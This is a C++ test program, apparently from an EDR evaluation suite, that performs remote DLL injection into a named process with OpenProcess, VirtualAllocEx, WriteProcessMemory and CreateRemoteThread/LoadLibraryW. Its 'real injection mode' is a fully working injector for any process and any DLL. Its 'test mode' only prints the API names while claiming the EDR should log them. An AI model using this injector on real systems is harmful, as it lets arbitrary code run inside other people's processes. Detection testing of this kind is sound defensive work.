﻿/*
 * DLL Injection Test - EDR Detection Test (Enhanced Version)
 * 
 * 목적: 원격 프로세스에 DLL을 주입하여 EDR의 프로세스 인젝션 탐지 능력을 테스트
 * Purpose: Test EDR's ability to detect DLL injection into remote processes
 * 
 * 탐지 포인트 (Detection Points):
 * - OpenProcess with PROCESS_ALL_ACCESS
 * - VirtualAllocEx for memory allocation in target process
 * - WriteProcessMemory to write DLL path
 * - CreateRemoteThread to execute LoadLibrary
 * 
 * Enhancements:
 * - error_handling.hpp integration
 * - RAII pattern for resource management
 * - Structured error handling
 * - logger.hpp integration
 * 
 * WARNING: For testing purposes only in isolated environments
 */

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include "../../include/error_handling.hpp"
#include "../../include/logger.hpp"

using namespace EDR;

// Find process ID by name
DWORD FindProcessId(const std::wstring& processName) {
    LOG_INFO("Searching for process: " + EDR::WStringToString(processName));
    
    PROCESSENTRY32W processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    HandleGuard snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
    if (!snapshot) {
        throw Exception(ErrorCode::SYSTEM_CALL_FAILED, 
                       "Failed to create process snapshot",
                       "FindProcessId", __FILE__, __LINE__);
    }

    if (Process32FirstW(snapshot.get(), &processEntry)) {
        do {
            if (processName == processEntry.szExeFile) {
                DWORD pid = processEntry.th32ProcessID;
                LOG_INFO("Process found with PID: " + std::to_string(pid));
                return pid;
            }
        } while (Process32NextW(snapshot.get(), &processEntry));
    }

    throw Exception(ErrorCode::PROCESS_NOT_FOUND, 
                   "Process not found: " + EDR::WStringToString(processName),
                   "FindProcessId", __FILE__, __LINE__);
}

// Perform DLL injection with enhanced error handling
bool InjectDLL(DWORD processId, const std::wstring& dllPath) {
    try {
        LOG_INFO("Starting DLL injection");
        LOG_INFO("Target Process ID: " + std::to_string(processId));
        LOG_INFO("DLL Path: " + EDR::WStringToString(dllPath));

        // Step 1: Open target process with RAII
        LOG_INFO("[1] Opening target process...");
        HandleGuard hProcess(OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            FALSE, processId
        ));

        if (!hProcess) {
            throw Exception(ErrorCode::PROCESS_ACCESS_DENIED, 
                           "Failed to open process",
                           "OpenProcess", __FILE__, __LINE__);
        }
        LOG_INFO("[+] Process opened successfully");

        // Step 2: Allocate memory in target process with RAII
        LOG_INFO("[2] Allocating memory in target process...");
        SIZE_T dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);
        
        MemoryGuard remoteMemory = AllocateMemoryGuard(hProcess.get(), dllPathSize, PAGE_READWRITE);
        if (!remoteMemory) {
            throw Exception(ErrorCode::MEMORY_ALLOCATION_FAILED, "Failed to allocate memory in target process",
                           "VirtualAllocEx", __FILE__, __LINE__);
        }
        
        std::stringstream ss;
        ss << "[+] Memory allocated at: 0x" << std::hex << remoteMemory.get() << std::dec;
        LOG_INFO(ss.str());

        // Step 3: Write DLL path to target process memory
        LOG_INFO("[3] Writing DLL path to target process...");
        if (!WriteProcessMemory(hProcess.get(), remoteMemory.get(), 
                               dllPath.c_str(), dllPathSize, NULL)) {
            throw Exception(ErrorCode::MEMORY_WRITE_FAILED, 
                           "Failed to write DLL path to target process",
                           "WriteProcessMemory", __FILE__, __LINE__);
        }
        LOG_INFO("[+] DLL path written successfully");

        // Step 4: Get address of LoadLibraryW
        LOG_INFO("[4] Getting LoadLibraryW address...");
        HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
        if (!hKernel32) {
            throw Exception(ErrorCode::DLL_NOT_FOUND, 
                           "Failed to get kernel32.dll handle",
                           "GetModuleHandleW", __FILE__, __LINE__);
        }

        LPVOID pLoadLibraryW = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryW");
        if (!pLoadLibraryW) {
            throw Exception(ErrorCode::API_NOT_AVAILABLE, 
                           "Failed to get LoadLibraryW address",
                           "GetProcAddress", __FILE__, __LINE__);
        }
        
        ss.str("");
        ss << "[+] LoadLibraryW address: 0x" << std::hex << pLoadLibraryW << std::dec;
        LOG_INFO(ss.str());

        // Step 5: Create remote thread to load DLL
        LOG_INFO("[5] Creating remote thread...");
        HandleGuard hThread(CreateRemoteThread(
            hProcess.get(), NULL, 0,
            (LPTHREAD_START_ROUTINE)pLoadLibraryW,
            remoteMemory.get(), 0, NULL
        ));

        if (!hThread) {
            throw Exception(ErrorCode::THREAD_CREATION_FAILED, 
                           "Failed to create remote thread",
                           "CreateRemoteThread", __FILE__, __LINE__);
        }
        LOG_INFO("[+] Remote thread created successfully");

        // Wait for thread to complete
        LOG_INFO("[*] Waiting for thread completion...");
        DWORD waitResult = WaitForSingleObject(hThread.get(), 5000);
        
        if (waitResult == WAIT_TIMEOUT) {
            LOG_WARN("Thread execution timeout");
        } else if (waitResult == WAIT_FAILED) {
            throw Exception(ErrorCode::REMOTE_THREAD_FAILED, 
                           "Failed to wait for remote thread",
                           "WaitForSingleObject", __FILE__, __LINE__);
        }

        DWORD exitCode = 0;
        if (GetExitCodeThread(hThread.get(), &exitCode)) {
            if (exitCode == 0) {
                LOG_WARN("Thread returned exit code 0 (possible DLL load failure)");
            } else {
                ss.str("");
                ss << "[+] Thread exit code: 0x" << std::hex << exitCode;
                LOG_INFO(ss.str());
            }
        }

        LOG_INFO("[+] DLL injection completed successfully");
        return true;

    } catch (const Exception& e) {
        LOG_ERROR(std::string("Injection failed: ") + e.what());
        std::wcerr << L"[-] " << EDR::StringToWString(e.what()) << std::endl;
        return false;
    } catch (const std::exception& e) {
        LOG_ERROR(std::string("Unexpected error: ") + e.what());
        std::wcerr << L"[-] Unexpected error: " << EDR::StringToWString(e.what()) << std::endl;
        return false;
    }
}

// Test mode: demonstrate injection steps
void RunTestMode() {
    try {
        LOG_INFO("Running in test mode");
        std::wcout << L"[*] Running in test mode..." << std::endl;
        std::wcout << L"[*] Spawning notepad.exe..." << std::endl;
        
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        ZeroMemory(&pi, sizeof(pi));

        if (!CreateProcessW(
            L"C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            throw Exception(ErrorCode::PROCESS_NOT_FOUND, 
                           "Failed to spawn notepad.exe",
                           "CreateProcessW", __FILE__, __LINE__);
        }

        // Use RAII for process/thread handles
        HandleGuard hProcess(pi.hProcess);
        HandleGuard hThread(pi.hThread);

        std::wcout << L"[+] Notepad spawned with PID: " << pi.dwProcessId << std::endl;
        LOG_INFO("Notepad spawned with PID: " + std::to_string(pi.dwProcessId));

        std::wcout << L"[*] Simulating injection steps (API calls that EDR should detect):" << std::endl;
        std::wcout << L"    1. OpenProcess(PROCESS_ALL_ACCESS)" << std::endl;
        std::wcout << L"    2. VirtualAllocEx(MEM_COMMIT | MEM_RESERVE)" << std::endl;
        std::wcout << L"    3. WriteProcessMemory()" << std::endl;
        std::wcout << L"    4. CreateRemoteThread(LoadLibrary)" << std::endl;

        Sleep(2000);
        
        if (!TerminateProcess(hProcess.get(), 0)) {
            LOG_WARN("Failed to terminate test process");
        }

        LOG_INFO("Test completed successfully");
        std::wcout << L"[+] Test completed. EDR should log these activities." << std::endl;

    } catch (const Exception& e) {
        LOG_ERROR(std::string("Test mode failed: ") + e.what());
        std::wcerr << L"[-] Test failed: " << EDR::StringToWString(e.what()) << std::endl;
    }
}

int wmain(int argc, wchar_t* argv[]) {
    // Initialize logger
    try {
        auto& logger = Logger::Instance();
        logger.SetLevel(EDRLOG_INFO);
        logger.EnableConsole(false);  // Avoid duplicate console output
        logger.SetOutputFile("dll_injection.log");
        LOG_INFO("=== DLL Injection Test Started ===");

    } catch (const std::exception& e) {
        std::wcerr << L"[-] Logger initialization failed: " 
                   << EDR::StringToWString(e.what()) << std::endl;
    }

    std::wcout << L"==================================================" << std::endl;
    std::wcout << L"    EDR Test: DLL Injection Technique" << std::endl;
    std::wcout << L"    Enhanced with Error Handling & Logging" << std::endl;
    std::wcout << L"    WARNING: For testing purposes only!" << std::endl;
    std::wcout << L"==================================================" << std::endl;
    std::wcout << std::endl;

    try {
        if (argc < 2) {
            std::wcout << L"Usage: " << argv[0] << L" <target_process_name> [dll_path]" << std::endl;
            std::wcout << L"Example: " << argv[0] << L" notepad.exe C:\\test\\payload.dll" << std::endl;
            std::wcout << std::endl;
            std::wcout << L"For basic test (spawns notepad.exe):" << std::endl;
            std::wcout << L"  " << argv[0] << L" test" << std::endl;
            return 1;
        }

        std::wstring targetProcess = argv[1];

        // Test mode: spawn notepad and simulate injection behavior
        if (targetProcess == L"test") {
            RunTestMode();
            return 0;
        }

        // Real injection mode
        DWORD pid = FindProcessId(targetProcess);
        
        std::wstring dllPath;
        if (argc >= 3) {
            dllPath = argv[2];
        } else {
            throw Exception(ErrorCode::INVALID_PARAMETER, 
                           "DLL path required for injection",
                           "wmain", __FILE__, __LINE__);
        }

        if (InjectDLL(pid, dllPath)) {
            std::wcout << L"\n[SUCCESS] EDR should have detected this injection attempt!" << std::endl;
            LOG_INFO("=== DLL Injection Test Completed Successfully ===");
            return 0;
        } else {
            std::wcerr << L"\n[FAILED] Injection failed" << std::endl;
            LOG_ERROR("=== DLL Injection Test Failed ===");
            return 1;
        }

    } catch (const Exception& e) {
        LOG_ERROR(std::string("Fatal error: ") + e.what());
        std::wcerr << L"\n[FATAL ERROR] " << EDR::StringToWString(e.what()) << std::endl;
        std::wcerr << L"Error Code: " << static_cast<int>(e.code()) << std::endl;
        return 1;
        
    } catch (const std::exception& e) {
        LOG_ERROR(std::string("Unexpected error: ") + e.what());
        std::wcerr << L"\n[FATAL ERROR] Unexpected: " 
                   << EDR::StringToWString(e.what()) << std::endl;
        return 1;
    }
}
